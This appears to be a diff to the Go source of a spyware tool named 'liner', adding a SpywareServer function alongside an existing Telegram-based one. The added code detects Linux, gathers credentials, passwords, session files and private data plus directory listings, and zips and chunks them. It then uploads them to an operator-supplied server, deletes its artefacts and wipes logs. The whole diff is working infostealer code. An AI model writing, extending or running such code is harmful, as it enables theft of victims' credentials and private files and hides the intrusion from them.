@@ -1,19 +1,18 @@
 package core
 
 import (
-	"bufio"
-	"fmt"
-	"io"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"strings"
-
-	"github.com/Nowafen/liner/payloads"
+    "bufio"
+    "fmt"
+    "io"
+    "os"
+    "os/exec"
+    "path/filepath"
+    "strings"
+	
+    "github.com/Nowafen/liner/payloads"
 )
 
-
-// Spyware handles data extraction based on dump type
+// Spyware handles data extraction and sends to Telegram
 func Spyware(dumpType, token, chatID string, silent bool) error {
 	// Detect OS
 	if !silent {
@@ -254,6 +253,252 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 			fmt.Printf("%s[WARNING]%s Failed to clean logs%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to clean logs: %v", err), silent)
+	}
+
+	return nil
+}
+
+// SpywareServer handles data extraction and sends to server
+func SpywareServer(dumpType, server, port, encryption string, silent bool) error {
+	// Detect OS
+	if !silent {
+		fmt.Printf("%s[INFO]%s Detecting OS...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	osInfo, err := payloads.DetectOS()
+	if err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to detect OS%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to detect OS: %v", err), silent)
+		return fmt.Errorf("failed to detect OS: %v", err)
+	}
+	if !strings.Contains(strings.ToLower(osInfo), "linux") {
+		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: This payload only supports Linux systems, detected: %s", osInfo), silent)
+		return fmt.Errorf("this payload only supports Linux systems, detected: %s", osInfo)
+	}
+
+	// Get current working directory
+	cwd, err := os.Getwd()
+	if err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to get current working directory%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, "Error: Failed to get current working directory", silent)
+		return fmt.Errorf("failed to get current working directory: %v", err)
+	}
+
+	// Create temp directory in current working directory
+	tempDir := filepath.Join(cwd, "liner_data")
+	if err := os.MkdirAll(tempDir, 0755); err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to create temp directory%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to create temp directory: %v", err), silent)
+		return fmt.Errorf("failed to create temp directory: %v", err)
+	}
+	defer func() {
+		if err := os.RemoveAll(tempDir); err != nil && !silent {
+			fmt.Printf("%s[WARNING]%s Failed to clean up temporary directory%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+	}()
+
+	// Collect data based on dump type
+	if !silent {
+		fmt.Printf("%s[INFO]%s Collecting files...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	var filesToCollect []string
+	switch strings.ToLower(dumpType) {
+	case "credentials":
+		filesToCollect = append(filesToCollect, collectCredentials()...)
+	case "password":
+		filesToCollect = append(filesToCollect, collectPasswords()...)
+	case "session":
+		filesToCollect = append(filesToCollect, collectSessions()...)
+	case "privatedata":
+		filesToCollect = append(filesToCollect, collectPrivateData()...)
+	case "all":
+		filesToCollect = append(filesToCollect, collectCredentials()...)
+		filesToCollect = append(filesToCollect, collectPasswords()...)
+		filesToCollect = append(filesToCollect, collectSessions()...)
+		filesToCollect = append(filesToCollect, collectPrivateData()...)
+	default:
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Invalid dump type, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, "Error: Invalid dump type, stopping", silent)
+		return fmt.Errorf("invalid dump type: %s", dumpType)
+	}
+
+	// Generate treestructure.txt for system
+	treeFile := filepath.Join(cwd, "treestructure.txt")
+	if !silent {
+		fmt.Printf("%s[INFO]%s Generating tree structures...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	var structureFiles []string
+	if err := generateTreeSchema(treeFile); err == nil {
+		structureFiles = append(structureFiles, treeFile)
+	}
+
+	// Generate user directory structures
+	userFiles, err := generateUserStructures(cwd)
+	if err == nil {
+		structureFiles = append(structureFiles, userFiles...)
+	}
+
+	// Check if there are any files to collect
+	if len(filesToCollect) == 0 {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s No files collected, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, "Error: No files collected, stopping", silent)
+		return fmt.Errorf("no files collected")
+	}
+
+	// Copy files to temp directory
+	if !silent {
+		fmt.Printf("%s[INFO]%s Copying files to temp directory...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	for _, file := range filesToCollect {
+		if _, err := os.Stat(file); err != nil {
+			continue
+		}
+		dest := filepath.Join(tempDir, filepath.Base(file))
+		if err := copyFile(file, dest); err != nil {
+			if !silent {
+				fmt.Printf("%s[WARNING]%s Failed to copy file %s: %v%s\n", ColorYellow, ColorWhite, file, err, ColorReset)
+			}
+			continue
+		}
+	}
+
+	// Zip files from temp directory
+	if !silent {
+		fmt.Printf("%s[INFO]%s Zipping files...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	zipFile := filepath.Join(cwd, "liner_data.zip")
+	if err := createZipFile(tempDir, zipFile); err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to create zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to create zip file: %v", err), silent)
+		return fmt.Errorf("failed to create zip file: %v", err)
+	}
+
+	// Send start message
+	if !silent {
+		fmt.Printf("%s[INFO]%s Sending start message to server...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	if err := sendServerMessage(server, port, encryption, "Hello, starting file transfer...", silent); err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to send start message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
+		}
+	}
+
+	// Send structure files (treestructure.txt and user files)
+	for _, file := range structureFiles {
+		if _, err := os.Stat(file); err == nil {
+			if !silent {
+				fmt.Printf("%s[INFO]%s Sending structure file %s to server...%s\n", ColorGreen, ColorWhite, filepath.Base(file), ColorReset)
+			}
+			if err := SendToServer(server, port, encryption, file, silent); err != nil {
+				if !silent {
+					fmt.Printf("%s[WARNING]%s Failed to send structure file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(file), err, ColorReset)
+				}
+				sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to send structure file %s: %v", filepath.Base(file), err), silent)
+			}
+		}
+	}
+
+	// Check zip file size (48MB = 48 * 1024 * 1024 bytes)
+	const maxZipSize = 48 * 1024 * 1024
+	var filesToSend []string
+	zipInfo, err := os.Stat(zipFile)
+	if err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to get zip file info: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to get zip file info: %v", err), silent)
+		return fmt.Errorf("failed to get zip file info: %v", err)
+	}
+
+	if zipInfo.Size() <= maxZipSize {
+		// Send zip file directly if size <= 48MB
+		if !silent {
+			fmt.Printf("%s[INFO]%s Sending zip file %s to server...%s\n", ColorGreen, ColorWhite, filepath.Base(zipFile), ColorReset)
+		}
+		if err := SendToServer(server, port, encryption, zipFile, silent); err != nil {
+			if !silent {
+				fmt.Printf("%s[WARNING]%s Failed to send zip file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(zipFile), err, ColorReset)
+			}
+			sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to send zip file %s: %v", filepath.Base(zipFile), err), silent)
+		}
+		filesToSend = []string{zipFile}
+	} else {
+		// Split zip file into 25MB parts if size > 48MB
+		if !silent {
+			fmt.Printf("%s[INFO]%s Splitting zip file...%s\n", ColorGreen, ColorWhite, ColorReset)
+		}
+		zipParts, err := splitZipFile(zipFile, cwd)
+		if err != nil {
+			if !silent {
+				fmt.Printf("%s[WARNING]%s Failed to split zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
+			}
+			sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to split zip file: %v", err), silent)
+			if err := os.Remove(zipFile); err != nil && !silent {
+				fmt.Printf("%s[WARNING]%s Failed to clean up main zip file%s\n", ColorYellow, ColorWhite, ColorReset)
+			}
+			return fmt.Errorf("failed to split zip file: %v", err)
+		}
+		// Send zip parts
+		for _, part := range zipParts {
+			if !silent {
+				fmt.Printf("%s[INFO]%s Sending zip part %s to server...%s\n", ColorGreen, ColorWhite, filepath.Base(part), ColorReset)
+			}
+			if err := SendToServer(server, port, encryption, part, silent); err != nil {
+				if !silent {
+					fmt.Printf("%s[WARNING]%s Failed to send zip part %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(part), err, ColorReset)
+				}
+				sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to send zip part %s: %v", filepath.Base(part), err), silent)
+			}
+		}
+		filesToSend = zipParts
+	}
+
+	// Send completion message
+	if !silent {
+		fmt.Printf("%s[INFO]%s Sending completion message to server...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	if err := sendServerMessage(server, port, encryption, "Goodbye, file transfer completed.", silent); err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to send completion message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
+		}
+	}
+
+	// Clean up zip parts and main zip file
+	for _, file := range filesToSend {
+		if err := os.Remove(file); err != nil && !silent {
+			fmt.Printf("%s[WARNING]%s Failed to clean up file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
+		}
+	}
+
+	// Clean up structure files
+	for _, file := range structureFiles {
+		if _, err := os.Stat(file); err == nil {
+			if err := os.Remove(file); err != nil && !silent {
+				fmt.Printf("%s[WARNING]%s Failed to clean up structure file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
+			}
+		}
+	}
+
+	// Clean logs
+	if !silent {
+		fmt.Printf("%s[INFO]%s Cleaning logs...%s\n", ColorGreen, ColorWhite, ColorReset)
+	}
+	if err := cleanLogs(); err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to clean logs%s\n", ColorYellow, ColorWhite, ColorReset)
+		}
+		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to clean logs: %v", err), silent)
 	}
 
 	return nil
